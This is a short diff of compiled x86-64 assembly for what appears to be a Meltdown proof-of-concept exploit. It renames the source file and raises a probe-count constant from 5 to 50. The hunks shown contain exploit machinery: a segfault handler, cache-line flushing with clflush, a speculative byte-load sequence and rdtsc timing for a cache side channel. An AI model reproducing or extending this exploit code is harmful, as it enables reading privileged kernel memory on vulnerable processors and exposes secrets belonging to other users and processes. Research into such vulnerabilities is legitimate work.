@@ -1,4 +1,4 @@
-	.file	"meltdownFrichetten.c"
+	.file	"meltdown50.c"
 	.text
 	.type	sigaction_segv, @function
 sigaction_segv:
@@ -45,7 +45,7 @@ probe_one:
 	movq	%fs:40, %rax
 	movq	%rax, -24(%rbp)
 	xorl	%eax, %eax
-	movl	$5, -2376(%rbp)
+	movl	$50, -2376(%rbp)
 	movl	$0, -2372(%rbp)
 	movl	$0, -2384(%rbp)
 	movl	$0, -2380(%rbp)
@@ -75,7 +75,7 @@ probe_one:
 	movq	%rax, -2352(%rbp)
 	movq	-2352(%rbp), %rax
 #APP
-# 106 "meltdownFrichetten.c" 1
+# 106 "meltdown50.c" 1
 	mfence
 	clflush	0(%rax)
 # 0 "" 2
@@ -92,7 +92,7 @@ probe_one:
 	movq	-2408(%rbp), %rdx
 	movq	-2416(%rbp), %rcx
 #APP
-# 158 "meltdownFrichetten.c" 1
+# 158 "meltdown50.c" 1
 	.global __speculative_byte_load_exit 
 	92:                              
 	xorq	%rax, %rax
@@ -6625,7 +6625,7 @@ __speculative_byte_load_exit:
 	movq	-2344(%rbp), %rax
 	movq	%rax, %rcx
 #APP
-# 120 "meltdownFrichetten.c" 1
+# 120 "meltdown50.c" 1
 	mfence
 	lfence
 	rdtsc
